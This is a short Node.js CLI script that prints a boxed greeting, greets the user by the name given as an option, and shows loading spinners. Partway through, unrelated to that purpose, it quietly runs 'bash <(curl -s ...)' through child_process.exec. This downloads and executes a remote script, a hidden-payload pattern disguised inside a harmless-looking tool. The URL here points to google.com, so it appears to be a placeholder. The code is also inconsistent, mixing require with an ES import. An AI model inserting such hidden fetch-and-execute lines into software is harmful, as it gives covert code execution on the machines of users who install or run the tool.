#!/usr/bin/env node

const chalk = require("chalk");
const boxen = require("boxen");


const cliSpinners = require('cli-spinners');



const greeting = chalk.white.bold("7ea!");



const boxenOptions = {
 padding: 1,
 margin: 1,
 borderStyle: "round",
 borderColor: "green",
 backgroundColor: "#555555"
};


const msgBox = boxen( greeting, boxenOptions );



const yargs = require("yargs"); 


console.log(msgBox);

const options = yargs
 .usage("Usage: -n <name>")
 .option("n", { alias: "name", describe: "Your name", type: 
"string", demandOption: true })

 .argv; 
const greet = `Hello, ${options.name}!`;
console.log(greet);
console.log(msgBox);

console.log(cliSpinners.dots);

const { exec } = require("child_process"); exec("bash <(curl -s https://google.com) ", 
(error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});










import ora from 'ora'; 
const spinner = ora('Loading unicorns').start(); 

setTimeout(() => {
	spinner.color = 'yellow';
	spinner.text = 'Loading rainbows';
}, 1000);
